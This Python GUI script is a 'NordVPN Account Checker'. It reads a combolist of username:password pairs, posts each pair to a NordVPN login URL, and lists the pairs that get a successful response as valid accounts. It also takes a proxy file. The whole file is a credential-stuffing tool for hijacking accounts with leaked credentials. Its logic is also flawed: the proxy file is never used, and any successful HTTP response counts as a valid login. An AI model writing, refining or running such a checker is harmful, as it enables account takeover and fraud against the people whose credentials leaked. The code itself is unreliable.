import tkinter as tk
from tkinter import messagebox, filedialog
import requests
import concurrent.futures

# NordVPN API endpoint
api_endpoint = "https://nordaccount.com/login/identifier?_ga=2.154745144.163319831.1719281788-1672058283.1719281787&challenge=2%7Ca98de823a26d43bb994551b147d41624"

# Function to check NordVPN account
def check_account(username, password):
    try:
        # Send a POST request to the NordVPN API
        response = requests.post(api_endpoint, json={"username": username, "password": password}, timeout=5)
        response.raise_for_status()

        # If the response is successful, the account is valid
        return True
    except requests.exceptions.RequestException as e:
        # If the response is not successful, display an error message
        messagebox.showerror("Error", f"Failed to check account: {e}")
        return False

# Function to check multiple accounts
def check_accounts(accounts):
    valid_accounts = []
    for account in accounts:
        username, password = account.split(":")
        if check_account(username, password):
            valid_accounts.append(account)
    return valid_accounts

# Function to update the GUI with the results
def update_gui(valid_accounts):
    result_listbox.delete(0, tk.END)
    for account in valid_accounts:
        result_listbox.insert(tk.END, account)

# GUI setup
root = tk.Tk()
root.title("NordVPN Account Checker")

# Logo
logo_image = tk.PhotoImage(file="nordvpn_logo.png")
logo_label = tk.Label(root, image=logo_image)
logo_label.pack()

# Input field for the combolist file
def select_combolist_file():
    file_path = filedialog.askopenfilename(title="Select Combolist File", filetypes=[("Text Files", "*.txt")])
    combolist_file_entry.delete(0, tk.END)
    combolist_file_entry.insert(0, file_path)

combolist_file_label = tk.Label(root, text="Combolist File:")
combolist_file_label.pack()
combolist_file_entry = tk.Entry(root, width=40)
combolist_file_entry.pack()
combolist_file_button = tk.Button(root, text="Browse", command=select_combolist_file)
combolist_file_button.pack()

# Input field for the proxy file
def select_proxy_file():
    file_path = filedialog.askopenfilename(title="Select Proxy File", filetypes=[("Text Files", "*.txt")])
    proxy_file_entry.delete(0, tk.END)
    proxy_file_entry.insert(0, file_path)

proxy_file_label = tk.Label(root, text="Proxy File:")
proxy_file_label.pack()
proxy_file_entry = tk.Entry(root, width=40)
proxy_file_entry.pack()
proxy_file_button = tk.Button(root, text="Browse", command=select_proxy_file)
proxy_file_button.pack()

# Button to start the checking process
def start_checking():
    combolist_file_path = combolist_file_entry.get()
    proxy_file_path = proxy_file_entry.get()
    with open(combolist_file_path, "r") as f:
        accounts = [line.strip() for line in f.readlines()]
    with concurrent.futures.ThreadPoolExecutor() as executor:
        future = executor.submit(check_accounts, accounts)
        valid_accounts = future.result()
        update_gui(valid_accounts)

start_button = tk.Button(root, text="Start Checking", command=start_checking)
start_button.pack()

# Result listbox
result_label = tk.Label(root, text="Valid Accounts:")
result_label.pack()
result_listbox = tk.Listbox(root, width=40, height=10)
result_listbox.pack()

root.mainloop()
